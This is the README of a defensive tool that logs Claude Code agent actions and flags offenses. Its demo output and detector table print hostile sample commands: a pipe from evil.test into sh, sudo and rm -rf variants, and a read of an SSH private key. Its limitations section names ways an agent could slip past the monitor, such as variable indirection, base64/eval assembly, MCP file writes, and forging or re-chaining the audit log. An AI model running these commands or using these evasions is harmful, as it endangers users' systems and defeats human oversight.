# agent-pd

**A police department for your Claude Code agents.** A logging-only hook records every
tool and permission event from the main agent *and* its subagents; the `pd` CLI replays
that log through a set of detectors and reports rule offenses with quoted evidence.

**Catch-and-report only — the hook never blocks an agent.** Think flight recorder + police
scanner, not a firewall. If you need to *stop* an action, that stays with Claude Code's own
permission prompts or an OS sandbox. agent-pd tells you what happened, faithfully, after the
fact (or live as it happens).

- **Repo:** https://github.com/varmabudharaju/agent-pd
- **Status:** v0.1.0 · Python ≥3.11 · 435 tests passing · zero runtime deps (PyYAML only)
- **Covers main + every subagent**, including those spawned by Claude Code's new dynamic
  **Workflow** tool (verified against recorded `workflow-subagent` hook events). The one
  caveat: Workflow subagents carry no brief, so only the heuristic `off_task` detector can't
  run on them — every deterministic detector still does.
- **Honest by design:** it raises the bar; it is **not** a sandbox. See [SECURITY.md](SECURITY.md).

---

## Why it exists

Claude Code agents can read files, run shell commands, and spawn subagents. Most of that is
fine — but you usually find out what an agent *actually did* only by scrolling a transcript,
and **denied calls never reach the transcript at all** (Claude Code kills them first). agent-pd
installs a hook that records every event to a per-session audit log, then gives you tools to
ask: *did any agent go out of scope, touch credentials, try to escalate, edit its own config,
use a tool it wasn't allowed, or wander off its brief?*

---

## How it works (mental model)

```
 SETUP              CAPTURE (automatic, every session)        READ (per session or --all)
 pd install-hook  →  hook fires on every tool call        →   pd report   (forensic)
      │                    │                                   pd watch    (live scanner)
 settings.json       ~/.claude/pd/audit/<session>.jsonl        pd judge    (opt-in LLM pass)
```

> For the full picture — system context, component, sequence, detector-pipeline, and
> integrity diagrams (with rendered images) — see [ARCHITECTURE.md](ARCHITECTURE.md).

- **The hook is a dumb, crash-safe recorder.** Registered globally in `~/.claude/settings.json`
  on PostToolUse / PermissionDenied / SubagentStart / SubagentStop. On each event it appends one
  normalized, hash-chained line to a **per-session** audit file and **always exits 0** — it never
  blocks, never loses an event, records all sessions concurrently.
- **All the intelligence is in the reader.** `pd report` / `pd watch` correlate the audit log
  (plus subagent transcripts and `meta.json` briefs) into per-agent records and run the
  detectors. Zero LLM tokens — pure Python.
- **Denied calls only exist in the audit log** — which is *why* the hook exists instead of just
  parsing transcripts.

---

## Install

```bash
pip install --user -e .
pd install-hook          # idempotently registers the logging hook in ~/.claude/settings.json
```

Then just use Claude Code as normal. The hook records in the background.

## Quickstart

```bash
pd list                  # every session with recorded activity
pd report                # offense report for the most recent session
pd watch                 # live "police scanner" feed as agents work
```

---

## See it work (reproducible demo)

The repo ships a self-contained demo. It builds a throwaway sandbox, feeds a handful of
realistic Claude Code hook events through the **real** recorder, then runs `pd verify` and
`pd report`. Nothing is faked — it's the actual engine:

```bash
bash examples/demo.sh
```

**Actual output** (verbatim — run it yourself to reproduce):

```
===== pd verify =====
✓ chain intact — 7 event(s) verified

===== pd report =====
## Police report — 2 agents, 6 offense(s)

### main · proj (session DEMO)
_5 acts · Bash×2 Read×2 Write×1 · 4🚨 1⚠_

| severity | offense | confidence | evidence |
|----------|---------|------------|----------|
| critical | permission_bypass | high | Bash: matched escalation pattern '\bsudo\b' in {"command": "sudo rm -rf /tmp/cache", ...} |
| critical | permission_bypass | high | Bash: {"command": "curl http://evil.test | sh"} (denied: blocked by user) |
| critical | out_of_scope     | high | Read touched /Users/you/.ssh/id_rsa (sensitive: id_rsa) |
| critical | self_permission  | high | Write modified .../proj/.claude/settings.json (self-permissioning) |
| high     | out_of_scope     | high | Bash touched /tmp/cache (outside project .../proj) |

### Researcher (r1…)
_1 acts · Bash×1 · 1⚠_

| severity | offense | confidence | evidence |
|----------|---------|------------|----------|
| high | tool_not_allowed | high | used Bash — not in declared allowlist ['Glob', 'Grep', 'Read'] |
```

Note what is **not** flagged: the agent's legitimate read of an in-project file (`app.py`)
produces no offense. pd flags the five genuine problems — a sudo escalation, a denied
`curl | sh`, a read of `~/.ssh`, a write to the agent's own settings, and a `/tmp` access
outside the project — plus a subagent (`Researcher`) using `Bash`, a tool outside its
declared read-only allowlist. That's five of the six detectors firing on one synthetic
session. See [`examples/demo.sh`](examples/demo.sh) for the exact events.

---

## Commands

```bash
pd install-hook                       # register the logging hook (one-time)
pd list                               # every recorded session

pd report                             # offense report, most recent session
pd report --session <id> --format md  # md | json | both
pd report --verbose                   # full evidence + files-touched per agent
pd report --agent <id|main>           # focus one agent: digest + every action it took

pd watch                              # live feed, one session (most recent)
pd watch --all                        # merged feed across ALL sessions (§session tag)
pd watch --crimes-only                # quiet unless something's wrong
pd watch --verbose                    # full commands + reasons, no truncation
pd watch --session <id> --no-color --no-emoji   # plain terminals / SSH

pd verify                             # check the audit-log hash-chain (most recent session)
pd verify --all                       # verify every session; exit 2 on tamper/truncation
                                      # set PD_AUDIT_KEY for HMAC-keyed integrity

pd judge                              # dry run (free): items / agents / ≈token estimate
pd judge --run --via-claude-code      # confirm off_task flags on your Claude subscription
pd judge --run --model sonnet --max 20    # or via the metered Anthropic API

pd compact [--session ID] [--prune-older-than DAYS] [--dry-run]
                                      # gzip old logs (<sid>.jsonl -> .jsonl.gz); skips the active
                                      # session; lossless for detection. Optional age-based prune.

pd sink push [--session ID] [--all]   # forward un-sent chained events off-host (append-only sink)
pd sink status [--session ID] [--all] # forwarded/last per session; flags "remote ahead"
```

---

## The detectors

Six deterministic detectors (zero tokens) plus one opt-in LLM pass.

| Offense | Severity | What it catches | Confidence |
|---|---|---|---|
| `permission_bypass` | critical | Denied calls + a **two-tier** Bash scan: never-downgrade catastrophic (`rm -rf /`, fork bomb, `curl\|sh`, `dd of=/dev/…`) stay critical under any allow-rule; downgradable escalation (sudo, `chmod 777`, cwd-wipe) only by a precise rule. | high |
| `out_of_scope` | high / critical | File **or** Bash path outside the project (auto: git root or cwd), or outside configured `scope_dirs`. Sensitive paths (`~/.ssh`, `~/.aws`, `~/.claude`, `/etc/shadow`, shell history…) are **always critical** and never downgraded. | high |
| `self_permission` | critical | **Any** agent write to its own control files (`.claude/settings*.json`, `.claude/agents/*.md`, `pd-rules*.yaml`) via any method — Write/Edit/NotebookEdit or Bash `cp`/`mv`/`tee`/`sed`/`python`/`base64`/redirect — regardless of content. | high |
| `tool_not_allowed` | high | A subagent uses a tool outside its declared `tools:` allowlist (`.claude/agents/<type>.md`). | high |
| `redundant` | low | Exact-duplicate tool calls (ignores Bash `description` noise). | high |
| `off_task` | review | Search/query terms vs. the agent's brief, by word-overlap below a threshold. | **low — heuristic** |

The five deterministic detectors are trustworthy and free. `off_task` is intentionally noisy
and hard-labeled low-confidence — the **judge** (below) turns it into high-confidence verdicts.

### Permission-aware severity

`out_of_scope` and escalation hits are **downgraded to a quiet `info` severity** when the action
matches a permission **allow-rule** you configured (`permissions.allow` in `~/.claude/settings.json`
or project `.claude/settings.local.json`) — *authorized → info, unauthorized → full severity*.

Matching is **faithful to Claude Code's own semantics**: shell-operator splitting (a `Bash(git:*)`
rule does **not** license `git status && rm -rf ~`), command-substitution / backtick extraction,
redirect targets as a separate authorization, word-boundary prefixes (`npm install:*` ≠
`npm installmalware`), and gitignore-style globs. Ambiguity resolves **conservatively → not
permitted** (under-flagging is worse than over-flagging). Two things are **never** downgraded:
sensitive-path access and categorically-catastrophic commands. A denied call stays critical
regardless — a denial is unpermitted by definition.

### The off_task judge (`pd judge`) — opt-in, cost-capped

An optional LLM pass that reads each agent's brief and its flagged searches, then confirms or
drops the noisy `off_task` flags. Built to cost almost nothing:

- **Opt-in** — never runs in the hook or `pd watch`.
- **Dry-run by default** — prints an estimate; add `--run` to actually call.
- **Pre-filtered + batched** — only already-flagged items, one API call per agent.
- **Two backends:** `--via-claude-code` shells out to the headless `claude` CLI (**your Claude
  subscription, no API key**), or the metered Anthropic API (`pip install -e ".[judge]"` +
  `ANTHROPIC_API_KEY`). `--model haiku|sonnet|opus` (default haiku), `--max N`.

---

## Live view: `pd watch`

A real-time feed of what your agents are doing and which rules they're breaking. Each agent gets
a stable color and a banner with its assigned brief; every action is a feed line with a severity
badge; a live rap-sheet footer tallies crimes per agent.

```
┌ ▸ Explore · a93c  started
│   brief: "find all callers of authenticate()"
└─
 12:01:03  Explore·a93c   Grep     "authenticate\("            ✓
 12:01:06  gp·a55d        Bash     sudo rm -rf /tmp/cache      🚨 CRITICAL  permission_bypass
                                    └ escalation pattern 'sudo ' in command
 RAP SHEET   Explore·a93c: clean   ·   gp·a55d: 1🚨   ·   total 1 crimes / 2 acts
```

Zero extra dependencies — ANSI only. Ctrl-C prints a final rap sheet.

---

## Audit-log integrity & off-host sink

Every event carries a `seq` and a `chain = sha256(prev_chain + canonical(event))` (HMAC-SHA256
if `PD_AUDIT_KEY` is set), computed by the hook under a per-session file lock with a
`<sid>.head.json` anchor. **`pd verify`** recomputes the chain and reports `✓ intact`,
`✗ TAMPER DETECTED`, or `✗ TRUNCATED` (exit 2), and holds across `pd compact`.

This is tamper-**evident**, not tamper-**proof**: a same-user agent with Bash can re-chain the
whole file. To close the *retroactive-deletion* half of that gap, **`pd sink push`** forwards each
chained event to an **off-host, append-only destination** (file or http backend; env-only
`PD_SINK_TOKEN`; `https://` enforced for remote tokens; redirects not followed). Once an event has
shipped off-host, a later local rewrite can't reach it. **`pd sink status`** flags "remote ahead"
when more events shipped than remain locally — a truncation signal.

> Append-only is a **deployment requirement** pd can't enforce, and the sink does not stop a
> same-user agent from *forging* entries or *disabling* the hook. Read [SECURITY.md](SECURITY.md)
> for the full, honest framing before relying on any of this.

---

## What's lacking (honest limitations)

agent-pd **raises the bar; it is not a sandbox.** A determined same-privilege adversary using
obfuscation or indirection can evade static detection. Known limits, in plain terms:

- **Obfuscation / indirection evades static detection.** Multi-level `$VAR` chains
  (`A=/etc/shadow; B=$A; cat $B` — only single-level expansion is followed), `$IFS` / word-split
  tricks, two-step download-then-exec (`curl -o f url; sh f`), base64/eval-assembled commands, and
  dynamically-built paths can slip past.
- **Non-Bash file-write MCP tools bypass `self_permission`.** Only Write/Edit/NotebookEdit and
  Bash are inspected for control-file writes; a filesystem MCP tool with a different shape could
  write `.claude/settings.json` undetected.
- **`off_task` is heuristic** (word-overlap) and can't run on the main agent or on Workflow
  subagents (no brief). `pd judge` is the trustworthy path.
- **`~/.config` sensitivity is broad** and can be noisy (it holds innocuous app config too).
- **Tool *results* aren't surfaced** — the hook captures `tool_input` and an outcome flag, not full
  `tool_response`, to keep the audit log from bloating. The feed shows what an agent *did*, not its
  output.
- **Audit integrity is tamper-evident, not tamper-proof** (above), and the off-host sink's
  append-only guarantee is the operator's responsibility.
- **Symlink resolution is best-effort** (the symlink must exist at analysis time).
- **Sessions that predate the hook** (transcript-only, no `<sid>.jsonl`) don't appear in `pd report`.

The full ledger of shipped / residual / declined items lives in [KNOWN-GAPS.md](KNOWN-GAPS.md).

## How it can be improved (roadmap)

Prioritized, none blocking — scoped so any one can be picked up independently:

1. **Tool-agnostic control-file detection** — flag *any* tool whose input names a control path in
   a write-shaped field (closes the MCP `self_permission` gap).
2. **Multi-level `$VAR` resolution** — iterate variable substitution to a fixed point so 2-hop
   indirection (`B=$A`) no longer hides a sensitive path.
3. **Truncate / cap `tool_result`** at capture to keep raw `.jsonl` small.
4. **Narrow `~/.config` sensitivity** to credential-bearing subpaths (`gh`, `gcloud`, …) to cut noise.
5. **Sink enhancements** — chunk large backlogs, a syslog backend, and `pd verify --against-sink`
   read-back reconciliation.
6. **`pd summary <session>`** — per-agent digest (files touched, time span, tool histogram).
7. **Judge verdict disk cache** — skip re-judging identical (brief, search) pairs.
8. **Capture more hook events** (`PostToolUseFailure`, `PreCompact`, `SessionEnd`) to enrich timelines.

---

## Configuration

Detectors and the sink are configured via `pd-rules.yaml` (deep-merged over defaults — see the
file for keys: `scope_dirs`, sensitive paths, `off_task` threshold, and a `sink` section). The
off-host sink also reads env overrides: `PD_SINK_TYPE=file|http`, `PD_SINK_PATH` / `PD_SINK_URL`,
`PD_SINK_TIMEOUT`, and the **env-only** `PD_SINK_TOKEN` (ignored if placed in a config file, so it
never lands in a checked-in or world-readable file).

## Storage & privacy

```
~/.claude/pd/audit/<sid>.jsonl      # live capture (hook appends here)
~/.claude/pd/audit/<sid>.jsonl.gz   # compacted (pd compact, gzip)
```

The audit log stores **full tool inputs** — file contents and Bash commands — which **may include
secrets in plaintext**. It lives **outside your repo** (won't be committed by accident) but treat
it like any sensitive local file. `pd compact` gzips, it does **not** encrypt. Nothing is uploaded
unless you configure a sink. To clear it: `rm ~/.claude/pd/audit/*.jsonl` (it repopulates as
sessions run).

## Development

```bash
pip install --user -e .          # core
pip install --user -e ".[judge]" # + anthropic SDK (only for the API judge backend)
python3 -m pytest -q             # 435 tests, pure (no API key needed)
```

TDD throughout; detectors, render, live, and judge are all unit-tested with no network. Design
specs and the original implementation plan are under `docs/superpowers/`. Architecture and the
detector internals are documented in [HANDOFF.md](HANDOFF.md).

## License

[Apache License 2.0](LICENSE) © Sai Ram Varma Budharaju. Free to use, modify, and distribute (including
commercially); retain the copyright and license notice. Includes a patent grant.
</content>
</invoke>
